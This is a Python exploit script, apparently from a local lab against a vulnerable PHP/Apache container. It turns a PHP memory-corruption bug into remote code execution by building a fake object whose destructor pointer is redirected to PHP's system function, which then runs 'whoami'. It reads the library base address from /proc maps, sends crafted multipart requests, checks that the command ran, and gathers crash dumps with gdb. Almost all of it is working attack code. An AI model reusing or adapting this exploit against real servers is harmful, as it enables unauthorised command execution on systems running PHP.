#!/usr/bin/env python3
"""oom75b: aimed dispatch on the STILL-ARMED boot measured by oom75.

Pinned (measured, this boot):
  libphp base = 0x7f228625b000 (maps, pre-warm; valid while boot lasts)
  VA0         = 0x7f2283a01718 (calibration core, T_cal[:16] first hit)
  phi         = 0  (rdi = T[0:8] exactly)
  rc check    = 01000000 08010000 at VA0+3584 (verified)
Aim: T_aim[0:8] = VA0+3584+8  (next copy's rc field; decrement -> 0 ->
  rc_dtor_func -> store_del -> free_obj=zif_system -> system("whoami>/tmp/x"))
"""
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
BASE = 0x7f228625b000
VA0 = 0x7f2283a01718
PHI = 0
TARGET = VA0 + 3584 + 8


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def build_tile():
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)
    struct.pack_into("<Q", T, 32, VA0 + 152)
    struct.pack_into("<I", T, 52, 1)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)
    struct.pack_into("<Q", T, 128, len(CMD))
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, BASE + ZIF_SYSTEM)
    T[PHI:PHI + 8] = struct.pack("<Q", TARGET)
    return bytes(T)


print("=== oom75b: aimed dispatch, pinned boot ===", flush=True)
# boot guard: same libphp base?
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
cur = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        cur = int(ln.split()[0].split("-")[0], 16)
        break
print("    boot base now: 0x%x (want 0x%x)" % (cur or 0, BASE), flush=True)
if cur != BASE:
    print("[ABORT] boot changed — re-run oom75 (fixed builder) for a fresh cycle", flush=True)
    sys.exit(1)

T_aim = build_tile()
assert struct.unpack_from("<Q", T_aim, 0)[0] == TARGET
print("    tile aimed: [0:8]=0x%x, free_obj=0x%x" % (TARGET, BASE + ZIF_SYSTEM), flush=True)

for fi in range(3):
    code, resp = post(P.build_attack(3400, 9300000 + fi * 100000, value_tile=T_aim))
    print("  aim-fire%d: %s %r" % (fi, code, resp[:60]), flush=True)
    time.sleep(2)
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    print("    /tmp/x: [%s]" % x, flush=True)
    if "No such" not in x:
        print("*** RCE CONFIRMED (aim-fire%d) ***" % fi, flush=True)
        break
    if code != "200":
        time.sleep(3)
        sh("docker cp php_vuln:/tmp/core /tmp/c75b_%d && docker cp /tmp/c75b_%d phpbuild:/tmp/c75b_%d" % (fi, fi, fi), 240)
        out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" -ex \"bt 2\" /tmp/libphp.69.so /tmp/c75b_%d'" % fi, 240)
        print("    crash: %s" % out[:400], flush=True)

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
